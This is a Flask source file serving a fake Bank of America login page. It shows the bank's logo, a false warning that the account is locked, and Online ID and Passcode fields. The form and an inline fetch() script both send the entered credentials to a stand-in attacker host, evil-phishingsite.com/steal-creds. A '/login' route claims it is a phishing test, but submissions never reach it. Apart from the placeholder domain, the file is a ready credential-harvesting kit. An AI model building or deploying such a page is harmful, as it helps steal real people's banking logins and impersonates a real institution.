from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string('''
        <div style="max-width:400px;margin:60px auto;padding:2rem;border-radius:1rem;box-shadow:0 4px 32px rgba(0,0,0,0.08);background:#fff;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Bank_of_America_logo.svg/320px-Bank_of_America_logo.svg.png" style="width:120px;display:block;margin:0 auto 1rem auto;">
            <h2 style="color:#2d3748;text-align:center;margin-bottom:1.5rem;">Bank of America Secure Login</h2>
            <div class="alert alert-danger" style="text-align:center;">Your account has been locked due to suspicious activity.<br>Please login to verify your identity.</div>
            <form method="POST" action="https://evil-phishingsite.com/steal-creds">
                <div class="mb-3">
                    <label>Online ID</label>
                    <input type="text" name="username" class="form-control" placeholder="Enter your Online ID" required>
                </div>
                <div class="mb-3">
                    <label>Passcode</label>
                    <input type="password" name="password" class="form-control" placeholder="Enter your Passcode" required>
                </div>
                <input type="hidden" name="phish_token" value="{{ 123456789 }}">
                <button type="submit" class="btn btn-danger w-100">Secure Sign In</button>
            </form>
            <a href="#" style="display:block;text-align:center;margin-top:1rem;">Forgot your Online ID?</a>
            <p style="margin-top:1rem;color:#888;font-size:0.95rem;text-align:center;">© 2024 Bank of America</p>
        </div>
        <script>
            // Suspicious script to mimic credential stealing
            document.querySelector('form').addEventListener('submit', function(e) {
                // Fake exfiltration
                fetch('https://evil-phishingsite.com/steal-creds', {
                    method: 'POST',
                    body: new FormData(this)
                });
            });
        </script>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css">
    ''')

@app.route('/login', methods=['POST'])
def login():
    return "<h3 style='color:red;text-align:center;margin-top:3rem;'>This was a phishing test page. Don't enter real credentials!</h3>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000) 